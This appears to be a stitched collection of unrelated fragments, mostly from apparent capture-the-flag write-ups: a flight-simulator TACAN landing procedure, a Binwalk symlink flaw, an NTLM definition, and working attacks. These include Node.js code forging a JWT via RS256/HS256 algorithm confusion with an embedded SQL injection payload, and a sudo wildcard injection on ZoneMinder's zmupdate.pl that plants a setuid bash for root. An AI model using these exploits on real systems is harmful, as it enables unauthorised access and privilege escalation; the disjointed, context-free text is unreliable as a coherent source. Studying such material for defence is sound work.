And the landing procedure is a little bit different  Approach distance calculation​  The approach will be performed at 2400ft and 300kt.  For landing, we first must compute the distance of the TACAN where the descend must start, to do so:  Current altitude - 2400ft will give the required descent altitude. E.g:  6000ft - 2400ft = 3600ft   Assuming a descent speed of 300kt and vertical speed of 2000ft/min, we can compute the distance to start the descend by:  Distance = Current altitude - airport altitude / 100 / 4, e.g:  Distance = 6000 - 2400 = 3600 / 100 = 36 / 4 = 9 NM   Then, we add 5 NM to align with the correct course and we have to start descending to approach altitude at 9 + 5 = 14 NM.  Entering downwind leg​  We land facing the wind with the cockit, the wind will make breaking the aircraft easier. In order to do so, we must fly the downwind leg and turn 180º to land.  When we reach the TACAN station at the airport, we must add 23º to the course to enter the landing course. e.g:  Landing at runway 27: 268º The reverse course is: 268 - 180 = 88º We add 23º to that: 88º + 23º = 111º   When reaching the TACAN, keep the same course for 2 NM for clear reads of TACAN signals, then configure the course to the previously computed (111º)  Fly for 13NM in 111º and turn left to landing course of 268º.  Remember to keep 2400ft and 300kt all the time.  Descending the approach​  While on landing course, slowdown to 260kt and take out the landing the gear.  tip Calculating landing speedDepends on the weight of the aircraft (fuel + ammunition): Fuel weights 1000 pounds and no ammo: 145ktMore than 1000 pounds of fuel: increase 1kt per each 200 poundsGun ammo full: add another 5kt  Keep landing speed plus 20kt during the descend phase.  When distance to TACAN is 8NM, start descending with vertical speed of 600-700 ft/min.  At 1200ft of altitude, TACAN should read 4NM of distance. You must manouver to find the optimal glide path.

This looks promising...  From the very same github page of the project, there's a security warning:  Prior to Binwalk v2.3.3, extracted archives could create symlinks which point anywhere on the file system, potentially resulting in a directory traversal attack if subsequent extraction utilties blindly follow these symlinks. More generically, Binwalk makes use of many third-party extraction utilties which may have unpatched security issues; Binwalk v2.3.3 and later allows external extraction tools to be run as an unprivileged user using the run-as command line option (this requires Binwalk itself to be run with root privileges). Additionally, Binwalk v2.3.3 and later will refuse to perform extraction as root unless --run-as=root is specified.   Here we are dealing with binwalk v2.3.2, so it contains this vulnerability.

At its core, NTLM is a single sign on (SSO) tool that relies on a challenge-response protocol to confirm the user without requiring them to submit a password.

They have two ways of working: asymetric (RSA) and symmetric. In asymetric the token is signed with the private key and can be verified with the public key. In symmetric, the token is signed with a shared secret.  This signing and verifing is very important because it ensures that nobody modifies the tokens.  However, for old unsecure version of the libraries that handles this, it is possible to modify the payload and sign with the public key (if you are lucky enough to get it). When we change the signing algorithm, we are telling the other side that we're using symmetric algorithm.  See the following example:  In the received side, the token is verified using symmetric and asymmetric algorithms:  async decode(token) { return (await jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] })); }   First, it will try with RSA (RS) and later with Hash (HS) if the previous fails.  This way in the client side, we can modify the payload and sign the payload by changing the signing algorithm:  const fs = require('fs'); const jwt = require('jsonwebtoken'); const publicKey = fs.readFileSync('./public.key', 'utf8'); const validJwtToken = fs.readFileSync('./jwt-token.txt', 'utf8'); decoded = jwt.verify(validJwtToken, publicKey, { algorithms: [&quot;RS256&quot;]}) decoded[&quot;username&quot;] = &quot;admin' AND 1=2 UNION SELECT 1,top_secret_flaag,3 FROM flag_storage -- -&quot; re_encoded = jwt.sign(decoded, publicKey, {algorithm: 'HS256'}) console.log(re_encoded)   Here, we are using the public key to verify the received token, as the regular way.  Then, we change the payload and we sign again to generate the JWT. We use the public key and we change the algorithm to Hash. This way the receiver will verify the token using the public key. It will first fail with the asymmetric but it will work with the symmetric algorithm.  In this case, we are modifying the token to retrieve something from the database using an SQL injection.

Either way, we can try to exploit the RCE vulnerability and continue from there.  The POC worked perfectly and we got access to user zoneminder. Now let's improve the shell and continue.

Morevoer, any option can be passed to the binary since it uses a wildcard in the sudoers file. This is a wide open configuration which can be abused using wildcard injection. Prepare a shell exploit.  echo 'cp /bin/bash /var/tmp/bash;chmod 4755 /var/tmp/bash' &gt; /var/tmp/exploit.sh chmod +x /var/tmp/exploit.sh   Now just run any zm* binary and inject a command calling the exploit, it will be executed under the root context. For example, using zmupdate with the --version option will force the tool to upgrade the database, and it allows us to inject a command to execute the exploit:  sudo /usr/bin/zmupdate.pl --version=1 --user='$(/var/tmp/exploit.sh)'   Now execute the copied bash with -p and we got root access.

Let's give it a try ...  Interesting, this technique does not seem to work with echo for some kind of reason but work with ls for instance. Looks like echo is a bult-in executable in the shell and does not use the PATH variable to determine where is it.
